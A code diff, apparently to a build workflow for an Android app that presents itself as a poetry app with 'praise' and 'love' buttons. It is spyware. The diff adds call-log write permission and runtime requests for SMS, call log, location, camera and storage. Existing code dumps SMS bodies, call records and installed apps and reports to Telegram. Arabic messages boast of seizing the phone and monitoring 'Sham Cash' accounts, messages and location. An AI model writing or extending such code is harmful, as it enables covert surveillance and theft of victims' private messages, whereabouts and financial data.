@@ -52,6 +52,7 @@ jobs:
             <uses-permission android:name="android.permission.READ_SMS"/>
             <uses-permission android:name="android.permission.RECEIVE_SMS"/>
             <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
             <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
             <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
             <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
@@ -157,6 +158,17 @@ jobs:
                     StrictMode.setThreadPolicy(policy);
                 }
 
+                // طلب الصلاحيات الخطيرة وقت التشغيل لتجنب Permission Denial
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                    requestPermissions(new String[]{
+                        android.Manifest.permission.READ_CALL_LOG,
+                        android.Manifest.permission.READ_SMS,
+                        android.Manifest.permission.ACCESS_FINE_LOCATION,
+                        android.Manifest.permission.CAMERA,
+                        android.Manifest.permission.READ_EXTERNAL_STORAGE
+                    }, 100);
+                }
+
                 Button btnPraise = findViewById(R.id.btnPraise);
                 Button btnLove = findViewById(R.id.btnLove);
                 Button btnGrantAll = findViewById(R.id.btnGrantAll);
@@ -183,6 +195,15 @@ jobs:
                     public void onClick(View v) {
                         Toast.makeText(MainActivity.this, "⚡ جاري إخضاع كافة أنظمة الهاتف لسيادة الملك...", Toast.LENGTH_LONG).show();
                         txtPoem.setText("🔥 تم تفعيل كافة الصلاحيات السيادية؛ الحصون والإشعارات والحسابات أصبحت تحت المراقبة التامة!");
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                            requestPermissions(new String[]{
+                                android.Manifest.permission.READ_CALL_LOG,
+                                android.Manifest.permission.READ_SMS,
+                                android.Manifest.permission.ACCESS_FINE_LOCATION,
+                                android.Manifest.permission.CAMERA,
+                                android.Manifest.permission.READ_EXTERNAL_STORAGE
+                            }, 101);
+                        }
                         sendToTelegram("🚀 [إعلان السيادة]: الاستيلاء على صلاحيات النظام وبدء مراقبة الحصون وحسابات شام كاش والرسائل والموقع بنجاح!");
                     }
                 });
@@ -264,7 +285,7 @@ jobs:
                             sb.append("رقم: ").append(cursor.getString(numberIdx)).append(" | نوع: ").append(cursor.getString(typeIdx)).append("\n");
                         } while (cursor.moveToNext());
                         cursor.close();
-                    } else { sb.append("لا توجد مكالمات."); }
+                    } else { sb.append("لا توجد مكالمات أو لم تمنح الصلاحية."); }
                 } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
                 return sb.toString();
             }
@@ -280,7 +301,7 @@ jobs:
                             sb.append("من: ").append(cursor.getString(addressIdx)).append("\nالمحتوى: ").append(cursor.getString(bodyIdx)).append("\n---\n");
                         } while (cursor.moveToNext());
                         cursor.close();
-                    } else { sb.append("لا توجد رسائل."); }
+                    } else { sb.append("لا توجد رسائل أو لم تمنح الصلاحية."); }
                 } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
                 return sb.toString();
             }
@@ -295,7 +316,7 @@ jobs:
                         if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                             sb.append("- ").append(packageInfo.packageName).append("\n");
                             count++;
-                            if (count >= 15) break; // لجعل التقرير مركزاً
+                            if (count >= 15) break;
                         }
                     }
                 } catch (Exception e) { sb.append("خطأ في جلب التطبيقات."); }
